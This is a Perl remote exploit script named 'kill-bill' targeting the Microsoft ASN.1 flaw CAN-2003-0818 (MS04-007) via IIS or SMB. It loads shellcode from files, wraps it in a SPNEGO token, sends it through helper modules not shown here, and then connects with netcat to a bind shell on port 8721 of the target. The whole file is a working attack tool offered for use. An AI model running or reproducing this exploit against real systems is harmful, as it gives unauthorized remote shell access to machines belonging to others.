#!/usr/bin/perl -w

use strict;

use MIME::Base64;
use IO::Socket;
use Getopt::Std;

use SPNEGO;
use IIS;
use SMB;

print ". kill-bill : Microsoft ASN.1 remote exploit for CAN-2003-0818 (MS04-007)\n";
print "  by Solar Eclipse <solareclipse\@phreedom.org>\n";
print "\n";

my %opts;

if (!getopts("?hp:s:", \%opts) || (!$opts{'p'} && !$opts{'s'}) || ($#ARGV != 0)) {
	print "Usage: kill-bill -p <port> -s <service> host\n";
	print "\n";
	print "Services:\n";
	print "   iis           IIS HTTP server (port 80)\n";
	print "   iis-ssl       IIS HTTP server with SSL (port 443)\n";
	print "   exchange      Microsoft Exchange SMTP server (port 25)\n";
	print "   smb-nbt       SMB over NetBIOS (port 139)\n";
	print "   smb           SMB (port 445)\n";
	print "\n";
	print "If a service is running on its default port you don't have to\n";
	print "specify both the service and the port.\n";
	print "\n";
	print "Examples: kill-bill -s iis 192.168.0.1\n";
	print "          kill-bill -p 80  192.168.0.1\n";
	print "          kill-bill -p 1234 -s smb 192.168.0.1\n";

	exit 1;
}

my $host = shift @ARGV;
my $port = $opts{'p'};
my $service = $opts{'s'};

if (!$service) {
	if ($port == 25) {
		$service = 'exchange';
	} elsif ($port == 80) {
		$service = 'iis';
	} elsif ($port == 139) {
		$service = 'smb-nbt';
	} elsif ($port == 443) {
		$service = 'iis-ssl';
	} elsif ($port == 445) {
		$service = 'smb';
	} else {
		die "You must specify a service when using a non-standard port.\n";
	}
}

# Read the stage0 and stage1 shellcode

print ". Loading shellcode\n";

my $stage0 = read_file("stage0");
my $stage1 = read_file("win32_bind");

print ". Generating SPNEGO token\n";

my $token = SPNEGO::token($stage0, $stage1);

print "  SPNEGO token is " . length($token) . " bytes long.\n";

if ($service eq 'iis')
{
	if (!$port) { $port = 80; }

	print ". Exploiting IIS server at $host:$port\n";

	IIS::exploit($host, $port, $token);

	sleep(1);

	print ". Attempting to connect to shell on port 8721\n\n";
	system("nc $host 8721");
}
elsif ($service eq 'smb')
{
	if (!$port) { $port = 445; }

	print ". Exploiting SMB server at $host:$port\n";

	SMB::exploit($host, $port, $token);

	sleep(1);

	print ". Attempting to connect to shell on port 8721\n\n";
	system("nc $host 8721");
}
else {
	die "Service $service is not supported in this version.\n";
}

exit 0;

#
# Read binary data from a file
#

sub read_file
{
	my $file = shift;
	my $data; 
 
	# read shellcode from a file
	open(FILE, $file) || die ("Can't open file $file\n");
	binmode FILE;
 
	while (<FILE>) {
		$data .= $_;
	}
	close(FILE);

	return $data;
}
